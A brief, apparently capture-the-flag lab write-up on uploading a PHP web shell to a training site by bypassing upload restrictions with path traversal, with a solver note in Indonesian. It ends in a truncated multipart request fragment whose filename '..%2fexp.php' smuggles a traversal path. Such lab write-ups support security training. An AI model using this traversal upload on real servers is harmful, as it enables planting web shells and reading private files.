Lab: Web shell upload via path traversal

Challenge Description
 This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: wiener:peter 

goal
get contents of file /home/carlos/secret

solver
diberikan sebuah web dengan lfi vulnerable via path traversal,
sama seperti sebelumnya bedanya untuk bypass bisa dengan

```bash
------geckoformboundary8fe23840f10ef849b97f03fd2a0edc3c
Content-Disposition: form-data; name="avatar"; filename="..%2fexp.php"
Content-Type: application/octet-
```